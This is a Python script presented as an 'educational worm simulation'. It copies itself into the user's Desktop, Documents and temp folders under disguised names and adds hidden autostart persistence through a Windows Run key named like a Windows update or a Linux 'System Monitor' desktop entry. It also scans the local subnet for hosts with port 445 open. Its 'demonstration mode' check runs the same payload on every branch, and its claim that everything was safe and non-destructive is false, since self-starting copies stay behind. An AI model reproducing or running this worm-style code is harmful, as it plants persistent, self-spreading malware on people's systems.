import os
import shutil
import socket
import subprocess
import sys
import time
import random

def get_self_path():
    return os.path.abspath(__file__)

def replicate_local():
    self_path = get_self_path()
    worm_name = os.path.basename(self_path)
    
    target_dirs = [
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Documents'),
        os.environ.get('TEMP', '/tmp'),
        '/tmp' if os.name == 'posix' else 'C:\\Temp'
    ]
    
    for target_dir in target_dirs:
        if os.path.exists(target_dir):
            try:
                target_path = os.path.join(target_dir, f"system_check_{random.randint(1000,9999)}.py")
                if not os.path.exists(target_path):
                    shutil.copy2(self_path, target_path)
                    print(f"[+] Replicated to: {target_path}")
                    
                    if os.name == 'posix':
                        os.chmod(target_path, 0o755)
            except Exception as e:
                pass

def add_persistence():
    self_path = get_self_path()
    
    if os.name == 'nt':
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, f"WindowsUpdate_{random.randint(100,999)}", 0, winreg.REG_SZ, self_path)
            print("[+] Persistence added via Registry")
        except:
            pass
    else:
        try:
            startup_dir = os.path.expanduser('~/.config/autostart')
            os.makedirs(startup_dir, exist_ok=True)
            desktop_file = os.path.join(startup_dir, f'system_monitor_{random.randint(100,999)}.desktop')
            
            with open(desktop_file, 'w') as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec=python3 {self_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            print("[+] Persistence added via autostart")
        except:
            pass

def network_scan():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        network_base = ".".join(local_ip.split(".")[:3])
        
        print(f"[*] Scanning network: {network_base}.0/24")
        
        for i in range(1, 10):
            ip = f"{network_base}.{i}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, 445))
                if result == 0:
                    print(f"[+] Found host: {ip}")
                sock.close()
            except:
                pass
    except:
        pass

def create_marker():
    marker_content = """
    This is a security demonstration file.
    Created by educational worm simulation.
    
    This file demonstrates how malware can:
    - Replicate itself to multiple locations
    - Add persistence mechanisms
    - Scan networks for other hosts
    
    REMOVE THIS FILE IF FOUND ON PRODUCTION SYSTEMS!
    """
    
    marker_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'SECURITY_DEMO_README.txt')
    try:
        with open(marker_path, 'w') as f:
            f.write(marker_content)
        print(f"[+] Created marker file: {marker_path}")
    except:
        pass

def main():
    print("🔍 Educational Security Simulation Started")
    print(f"📁 Running from: {get_self_path()}")
    print(f"💻 Hostname: {socket.gethostname()}")
    
    time.sleep(2)
    
    print("\n[PHASE 1] Local Replication")
    replicate_local()
    
    print("\n[PHASE 2] Persistence Setup")
    add_persistence()
    
    print("\n[PHASE 3] Network Discovery")
    network_scan()
    
    print("\n[PHASE 4] Creating Marker")
    create_marker()
    
    print("\n" + "="*50)
    print("EDUCATIONAL DEMONSTRATION COMPLETE")
    print("This simulation shows how worms operate.")
    print("All activities were safe and non-destructive.")
    print("="*50)
    
    time.sleep(3)

if __name__ == "__main__":
    if "education" in get_self_path().lower() or "demo" in get_self_path().lower():
        print("[!] Running in demonstration mode")
        main()
    else:
        print("[*] Simulation started from replicated location")
        main()
